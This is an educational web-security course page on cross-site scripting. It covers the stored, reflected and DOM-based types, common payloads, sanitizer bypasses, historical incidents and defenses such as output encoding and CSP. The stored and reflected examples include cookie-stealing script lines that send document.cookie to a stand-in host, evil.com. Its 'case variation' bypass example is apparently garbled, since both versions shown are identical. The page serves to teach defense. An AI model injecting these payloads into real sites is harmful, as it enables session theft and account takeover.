---
title: Cross-Site Scripting (XSS)
parent: Web Security
nav_order: 6
layout: page
header-includes:
  - \pagenumbering{gobble}
output:
  pdf_document:
    pandoc_args: ["--lua-filter=color-text-span.lua"]
---

# Cross-Site Scripting (XSS)

## 1. What is Cross-Site Scripting (XSS)?

Imagine you are logged into your university’s online learning platform (such as D2L or Moodle). As we have seen, the Same-Origin Policy normally prevents a malicious website like `evil.com` from performing actions on your behalf while you have your university account open in another tab.

However, suppose your course has a discussion forum. An attacker posts a message that contains malicious JavaScript code hidden inside the post. When you (or any other student) open that forum post, the browser executes the attacker’s code as if it were part of the legitimate university website. Because the code is now running with the origin of your university platform, it has full access to your session cookies, can read any data displayed on the page, and can perform actions on your behalf, all while you are simply reading a normal-looking forum post.

This is a classic example of **Cross-Site Scripting (XSS)**. XSS is an injection attack in which an attacker injects malicious client-side scripts (usually JavaScript) into a trusted website. When other users visit the compromised page, their browsers execute the attacker’s code with the full privileges of the legitimate site.

In simple terms: the attacker tricks the victim’s browser into running malicious JavaScript while the victim is on a trusted website. Because the malicious script runs in the context of the trusted domain, it completely bypasses the Same-Origin Policy, effectively giving the attacker the same level of access as if they were logged in as the victim.

XSS is considered one of the most severe web vulnerabilities because the malicious code runs with the full privileges of the legitimate website. An attacker can steal the victim’s session cookies and hijack their account, read sensitive information displayed on the page (such as emails, grades, financial data, and personal messages), perform actions on the victim’s behalf (such as posting messages, changing settings, or submitting assignments), keylog everything the victim types, redirect the user to phishing sites, install malware, deface the website, or spread the attack to other users.

XSS has been used in many high-profile attacks throughout the history of the web. One of the most famous early examples is the _Samy Worm_ in 2005. It exploited a stored XSS vulnerability on MySpace and spread to over one million users in less than 24 hours, automatically adding the attacker as a friend and displaying a message on every infected profile.

Since then, attackers have repeatedly used XSS to steal banking credentials, compromise corporate email accounts, and even take over cryptocurrency exchanges. Even in recent years, major platforms have continued to suffer serious XSS vulnerabilities.

## Why XSS Is Still Common

Despite being well understood, XSS remains one of the most frequently reported vulnerabilities because:

- Developers often trust user input too much.
- Modern web applications are complex (heavy JavaScript usage, many third-party scripts, rich text editors).
- Many developers still use dangerous practices like `.innerHTML`, `document.write()`, or unescaped template variables.
- Sanitization is surprisingly difficult to get right (we will explore why in later sections).

In the next section, we will examine the three main types of XSS attacks.

## Types of XSS

There are three main types of Cross-Site Scripting attacks. Understanding the differences is important because each type has different attack vectors and requires slightly different defenses.

### 1. Stored (Persistent) XSS

Stored XSS, also known as persistent XSS, is the most dangerous type of Cross-Site Scripting attack.

In a stored XSS attack, the attacker submits malicious JavaScript code that gets **permanently stored** on the server — usually in a database. Whenever any user visits the affected page, the server includes this malicious script in the response, and the victim’s browser executes it as part of the legitimate website.

Common targets include comment sections, forum posts, user profiles, product reviews, and chat messages.

**Example**

Consider a vulnerable blog that allows users to post comments without proper input sanitization. An attacker posts the following malicious comment:

```html
<script>
  const img = new Image();
  img.src = "https://evil.com/steal?cookie=" + document.cookie;
</script>
```

What happens next:

- The malicious script is saved in the blog’s database.
- When any user (including administrators) opens the blog post and views the comment, the browser automatically executes the script.
- The victim’s session cookies are silently stolen and sent to the attacker’s server.
- The attacker can now use those cookies to hijack the victim’s account.

This attack **persists** until the malicious comment is manually deleted from the server.

### 2. Reflected (Non-Persistent) XSS

Reflected XSS, also known as non-persistent XSS, is the second major type of Cross-Site Scripting attack.

In a reflected XSS attack, the malicious script is **not stored** on the server. Instead, the attacker crafts a specially designed URL that contains malicious JavaScript and tricks the victim into clicking it (often through email, social media, or a phishing message). When the victim visits the link, the server immediately reflects the malicious input back into the response page, for example, in a search result or error message. The victim’s browser then executes the script as though it came from the trusted website.

Common targets for reflected XSS include search boxes, error pages, and login forms that use “return to” parameters.

**Example**

Consider a vulnerable search page that reflects the user’s search query directly into the HTML without escaping it. An attacker creates the following malicious link and sends it to the victim:

```http
https://vulnerable-site.com/search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

When the victim clicks the link:

1. The server reflects the `q` parameter directly into the page.
2. The browser executes the malicious JavaScript.
3. The victim is silently redirected to the attacker’s site, along with their session cookies.

This attack is called “reflected” because the malicious payload is not stored on the server. It only works when the victim actively visits the specially crafted URL.

### 3. DOM-based XSS

DOM-based XSS is a purely _client-side_ attack. Unlike stored and reflected XSS, the malicious payload never reaches the server at all.

In this attack, the attacker crafts a malicious URL that manipulates the page through JavaScript running in the browser. The vulnerable JavaScript code on the page reads data directly from the URL (such as query parameters or the fragment) and inserts it into the DOM in an unsafe way — for example, by using `.innerHTML` or `document.write()`.

**Example**

Consider the following vulnerable JavaScript code on a page:

```js
const name = new URLSearchParams(location.search).get("name");
document.getElementById("welcome").innerHTML = "Hello, " + name;
```

An attacker can craft a malicious URL like this:

```http
https://vulnerable-site.com/page?name=<img src=x onerror=alert('XSS')>
```

When the victim visits this URL, the JavaScript reads the `name` parameter from the URL and inserts it directly into the DOM using `.innerHTML`. The browser then parses and executes the malicious code entirely on the client side. The server never sees or processes the malicious payload.

## Common XSS Payloads and Sanitization

The core problem with XSS is simple: the attacker wants to make the victim's browser run malicious JavaScript as if it came from the trusted website. If we can stop the attacker from injecting executable JavaScript into the page, we can prevent the attack.

One common defense developers try is **input sanitization**, i.e., cleaning or filtering user input to remove dangerous JavaScript. However, this approach is extremely difficult to do correctly, as attackers have found countless ways to bypass naive filters.

### Common XSS Payloads

Here are some of the most frequently used XSS payloads:

- `<script>alert(1)</script>` — the classic way to execute JavaScript.
- `<img src=x onerror=alert(1)>` — triggers JavaScript when an image fails to load.
- `<svg onload=alert(1)>` — runs code when an SVG element loads.
- `javascript:alert(1)` — used inside `href` attributes or `src` values.
- `<iframe src="javascript:alert(1)"></iframe>` — executes JavaScript inside an iframe.
- `<body onload=alert(1)>` — runs code when the page finishes loading.
- `<input onfocus=alert(1) autofocus>` — automatically triggers when an input field gains focus.

Many developers believe that simply removing `<script>` tags or dangerous characters is enough. Unfortunately, this almost always fails. Here are some bypass techniques attackers use:

**1. Case variation and encoding**
Attackers change the case of HTML tags or encode the payload so it looks different to the sanitizer while still being valid HTML/JavaScript when executed:

```html
<!-- Normal version -->
<script>
  alert(1);
</script>

<!-- Case variation: some sanitizers only look for lowercase "script" -->
<script>
  alert(1);
</script>

<!-- URL-encoded version (common when input comes from URL parameters) -->
%3Cscript%3Ealert(1)%3C/script%3E
```

**2. Using alternative tags and event handlers**

Instead of using the obvious `<script>` tag, attackers use other HTML elements that can execute JavaScript through event handlers:

```html
<!-- Image tag with onerror handler -->
<img src="x" onerror="alert(1)" />

<!-- SVG element that runs code when loaded -->
<svg onload="alert(1)">
  <!-- Body tag that runs code when page loads -->
  <body onload="alert(1)">
    <!-- Input that automatically triggers when it gains focus -->
    <input onfocus="alert(1)" autofocus></input>
  </body>
</svg>
```

**3. Breaking or nesting tags**

Some weak sanitizers can be confused by broken or nested tags that still result in valid HTML after processing:

```html
<!-- Nested/broken tags that confuse some sanitizers -->
<scr<script>ipt>alert(1)</scr</script>ipt>
```

**4. JavaScript protocol in attributes**

Attackers can use the `javascript:` protocol inside HTML attributes (such as `href`) to execute code when the user clicks or interacts with the element:

```html
<!-- Clicking this link executes JavaScript instead of navigating -->
<a href="javascript:alert(1)">Click me</a>
```

## Historical Real-World XSS Vulnerabilities

XSS has been one of the most frequently exploited web vulnerabilities for over two decades. In recent years, multiple major social media platforms, SaaS products, and content management systems have continued to disclose serious XSS vulnerabilities. These incidents have affected millions of users and often led to account takeovers, data theft, and reputational damage.

One of the most famous early examples is the **Samy Worm** in 2005. It exploited a stored XSS vulnerability on MySpace and spread to over one million user profiles in less than 24 hours. The worm automatically added the attacker (Samy) as a friend and posted the message “but most of all, Samy is my hero” on every infected profile. This incident was one of the first major demonstrations of how quickly an XSS attack could spread across a large platform.

In 2014, a serious XSS vulnerability was discovered in **TweetDeck** (a popular Twitter client). The flaw allowed attackers to post tweets on behalf of any user who had the TweetDeck extension or app installed. Because the malicious payload was delivered through Twitter’s own infrastructure, it affected a large number of users and highlighted the risks of trusted platforms being used as attack vectors.

**GitHub** also suffered from a notable stored XSS vulnerability in 2018. Researchers discovered that specially crafted Markdown files could be used to execute JavaScript in the browsers of anyone who viewed the file on GitHub.

## Defenses Against XSS

There are several effective ways to defend against XSS attacks. The two most important defenses are context-aware output encoding and Content Security Policy (CSP). In addition, several other techniques can provide extra layers of protection.

### 1. Context-Aware Output Encoding

The most effective way to defend against XSS is called **context-aware output encoding**. This means we must escape user input differently depending on **where** we are placing it in the HTML page.

- When placing data inside HTML content (such as inside `<div>` or `<p>`), **HTML-encode** it.  
  Example: input `<script>alert(1)</script>` becomes `&lt;script&gt;alert(1)&lt;/script&gt;`

- When placing data inside an HTML attribute (such as `value="..."` or `href="..."`), **attribute-encode** it.  
  Example: input `"><script>alert(1)</script>` becomes `&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;`

- When placing data inside JavaScript code, **JavaScript-encode** it.  
  Example: input `'); alert(1); //` becomes `\'); alert(1); //`

- When placing data inside a URL, **URL-encode** it.  
  Example: input `hello world` becomes `hello%20world`

However, there are hundreds of ways to execute JavaScript in HTML, and each context (HTML content, attributes, JavaScript strings, and URLs) requires its own escaping rules. In addition, new HTML5 features and browser behaviors constantly introduce new attack vectors. Writing a complete and secure sanitizer from scratch is extremely difficult and error-prone. This is why security experts strongly recommend never trying to write your own sanitizer. Instead, always use a time-tested library. Some of the most trusted options include:

- **DOMPurify** (JavaScript) — The gold standard for client-side sanitization
- **OWASP Java Encoder** (Java)
- **bleach** (Python)
- **html-sanitizer** (PHP)
- Built-in sanitization functions in modern frameworks (React, Angular, Vue, etc.)

Here is a simple exmaple using DOMPurify:

```js
const clean = DOMPurify.sanitize(userInput);
document.getElementById("content").innerHTML = clean;
```

### 2. Content Security Policy (CSP)

**Content Security Policy (CSP)** is a powerful browser security mechanism that helps prevent XSS attacks. It works by telling the browser exactly which sources of content are allowed to be loaded and executed on the page. Even if an attacker manages to inject a `<script>` tag into the page, CSP can block it from running.

CPS works as follows: The server sends a special HTTP header called `Content-Security-Policy`. The browser then follows the rules defined in that header and blocks anything that violates them.

For example, a server might send this header:

```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none';
```

This header tells the browser:

- `default-src 'self'` → Only allow content from the same origin (your own website).
- `script-src 'self' https://cdn.example.com` → Only allow JavaScript from your own site and from `cdn.example.com`.
- `object-src 'none'` → Block all `<object>`, `<embed>`, and `<applet>` elements (which can be dangerous).

If an attacker tries to inject a script from a different domain (such as `evil.com`), the browser will simply refuse to execute it.

The key CSP directives are shown in the table below:

| Directive                       | Purpose                                      | Example Value               |
| ------------------------------- | -------------------------------------------- | --------------------------- |
| `default-src`                   | Fallback for all other directives            | `'self'`                    |
| `script-src`                    | Controls where JavaScript can be loaded from | `'self' https://cdn.com`    |
| `style-src`                     | Controls CSS sources                         | `'self' 'unsafe-inline'`    |
| `img-src`                       | Controls image sources                       | `'self' https://images.com` |
| `frame-src` / `frame-ancestors` | Controls iframes and embedding               | `'self'`                    |
| `object-src`                    | Controls plugins (Flash, etc.)               | `'none'` (recommended)      |
| `base-uri`                      | Controls the `<base>` tag                    | `'self'`                    |

#### Using Inline Scripts Safely with Nonces

By default, CSP blocks all inline JavaScript (such as `<script>alert(1)</script>`). However, modern CSP allows you to safely permit specific inline scripts using a **nonce** (a random, one-time value).

For example, a server could send this header:

```http
Content-Security-Policy: script-src 'self' 'nonce-abc123';
```

Then in your HTML, you include the same nonce:

```html
<script nonce="abc123">
  alert("This script is allowed");
</script>
```

The browser will only execute inline scripts that have the correct nonce. This way, you can still use inline scripts when needed, while blocking any scripts injected by attackers.

#### CSP Benefits and Common Mistakes

CSP is a very powerful defense. It can block XSS attacks even when input sanitization fails, significantly reduce the damage caused by successful attacks, and give developers fine-grained control over what can run on their pages. It is now supported by all major modern browsers.

However, there are some common CSP mistakes that developers often make:

- Using `'unsafe-inline'`: This allows all inline scripts and defeats most of CSP’s protection.
- Using `'unsafe-eval'`: This allows dangerous functions like `eval()` and should almost never be used.
- Forgetting to set `object-src 'none'`: This leaves dangerous plugin elements unprotected.
- Not testing the policy properly before deploying: A strict policy can accidentally break parts of your website (such as analytics, ads, or third-party widgets).

When used correctly, CSP is one of the strongest defenses available today and is highly recommended for all modern web applications.

### Additional Defenses and Best Practices

While proper output encoding and CSP are the two most important defenses, several additional layers can further reduce risk.

#### HttpOnly Cookies

Setting the `HttpOnly` flag on session cookies prevents JavaScript from accessing them:

```http
Set-Cookie: sessionid=abc123; HttpOnly; Secure
```

Even if an attacker achieves XSS, they cannot steal the session cookie using `document.cookie`. This greatly limits the damage of many XSS attacks.

#### Input Validation and Allowlisting

Although output encoding is the primary defense, proper input validation on the server side is still valuable. The best approach is allowlisting (whitelisting) rather than blacklisting. For example, if your application allows rich text comments, you should explicitly define which HTML tags and attributes are permitted, and reject everything else.

#### Web Application Firewalls (WAFs)

Many organizations use a Web Application Firewall (WAF) to detect and block common XSS payloads in incoming requests. While WAFs are useful as a defense-in-depth measure, they should never be relied upon as the only protection, because sophisticated attackers can often bypass them.

#### Trusted Types (Modern Browser Feature)

Trusted Types is a newer browser security feature designed to help prevent DOM-based XSS. It forces developers to use safe APIs for manipulating the DOM instead of dangerous ones like `.innerHTML`, `document.write()`, or `eval()`. When used correctly, Trusted Types can make DOM-based XSS much harder to exploit.
